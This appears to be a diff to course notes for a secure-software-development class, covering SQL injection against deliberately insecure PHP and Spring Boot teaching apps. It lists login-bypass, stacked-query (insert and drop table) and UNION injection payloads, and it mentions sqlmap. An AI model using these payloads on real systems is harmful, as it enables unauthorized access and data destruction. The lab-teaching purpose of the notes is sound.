@@ -5,7 +5,7 @@
 
 ZAP active scan
 
-## SQL Injection
+## SQL Injection (PHP)
 https://github.com/celalceken/InsecureWebApplicationProject
 
 Switch to 1.2.0 SQL Injection
@@ -18,6 +18,10 @@ Payload: A1';--
 
 Payload: admin'#  // (switch to mysql)
 
+## SQL Injection (Spring Boot)
+https://github.com/celalceken/spring-boot-examples/tree/master/insecurewebapplication
+
+Payload: admin2' or '1'--
 
 ### Blind SQL Injection 
 
@@ -44,7 +48,7 @@ Prepared statements are preveting multiple query execution //﻿"cannot insert m
 
 
 
-http://192.168.56.103/SecureSoftwareDevelopment/Lecture3WebApplicationArchitecture/1Examples/8JSONPHP.php
+https://github.com/celalceken/SecureSoftwareDevelopment/blob/master/Lecture3/1.2.PHPExamples/8JSONPHP.php
 
 Payload: '; insert into table1 values( 5, 'toX', 'toY', 4 );--
 
@@ -53,12 +57,13 @@ Payload: ';drop table "table2"; --
 ### Union Injections 
 Basically you can poison query to return records from another table.
 
-http://192.168.56.103/SecureSoftwareDevelopment/Lecture3WebApplicationArchitecture/1Examples/8JSONPHP.php
+https://github.com/celalceken/SecureSoftwareDevelopment/blob/master/Lecture3/1.2.PHPExamples/8JSONPHP.php
 
 A' UNION select adi, soyadi from "AkademikPersonel";--
 
 ### sqlmap
 
+https://github.com/celalceken/InsecureWebApplicationProject
 Switch to 1.3.1 Switch to MySQL DB -> SQL Injection
 
 
